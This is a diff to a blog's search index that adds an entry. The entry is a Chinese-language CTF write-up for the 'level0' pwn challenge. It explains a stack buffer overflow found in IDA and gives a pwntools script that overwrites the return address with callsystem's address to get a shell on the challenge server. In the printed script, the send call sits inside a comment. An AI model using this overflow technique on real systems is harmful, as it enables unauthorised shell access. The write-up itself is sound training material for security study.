@@ -4,6 +4,25 @@
   
     
     <entry>
+      <title>writeup_level0_pwn</title>
+      <link href="/2022/02/24/writeup_level0_pwn/"/>
+      <url>/2022/02/24/writeup_level0_pwn/</url>
+      
+        <content type="html"><![CDATA[<h1 id="writeup-level0-pwn"><a href="#writeup-level0-pwn" class="headerlink" title="writeup_level0_pwn"></a>writeup_level0_pwn</h1><p>ida打开附件：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220224153914432.png" alt="image-20220224153914432"></p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220224153937936.png" alt="image-20220224153937936"></p><p>可以看到read函数把int读入数组，有溢出漏洞，然后找到程序中的危险函数：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220224154528561.png" alt="image-20220224154528561"></p><p>只要成功对此函数实现调用就可以通过sh命令行控制系统。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220224154721048.png" alt="image-20220224154721048"></p><p>查看数据区域，可以看到上面贴心的给出了解释，r和s代表了程序的返回地址和储存的寄存器值，我们只要通过缓冲区溢出覆盖程序的返回地址，将返回地址覆盖为我们的目标函数起始地址，即可执行该函数。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220224155005913.png" alt="image-20220224155005913"></p><p>起始地址锁定为596，直接脚本抄袭开始!</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * <span class="comment">#导入 pwntools 中 pwn 包的所有内容 </span></span><br><span class="line">p = remote(<span class="string">&#x27;111.198.29.45&#x27;</span>,<span class="number">33907</span>) <span class="comment"># 链接服务器远程交互 </span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./level0&#x27;</span>) <span class="comment"># 以 ELF 文件格式读取 level0 文件 </span></span><br><span class="line">sysaddr = elf.symbols[<span class="string">&#x27;callsystem&#x27;</span>] <span class="comment"># 获取 ELF 文件中 callsystem 的地址 </span></span><br><span class="line"><span class="comment"># 先用 0x88 个无用字符覆盖 buf 和 push 的内容，再覆盖返回地址 </span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x80</span> + <span class="number">8</span>) + p64(sysaddr) </span><br><span class="line">p.recv() <span class="comment">#接收输出 p.send(payload) # 发送 payload </span></span><br><span class="line">p.interactive() <span class="comment"># 反弹 shell 进行交互</span></span><br></pre></td></tr></table></figure><p>太详细了，爱了。。。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220224155638026.png" alt="image-20220224155638026"></p><p>小跑一下，结果报错了。。。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220224155803770.png" alt="image-20220224155803770"></p><p>python3需要将字符串转化为二进制。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220224160542356.png" alt="image-20220224160542356"></p><p>pwn好复杂233</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> pwn </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>writeup_easyMaze_reverse</title>
       <link href="/2022/02/23/writeup_easyMaze_reverse/"/>
       <url>/2022/02/23/writeup_easyMaze_reverse/</url>
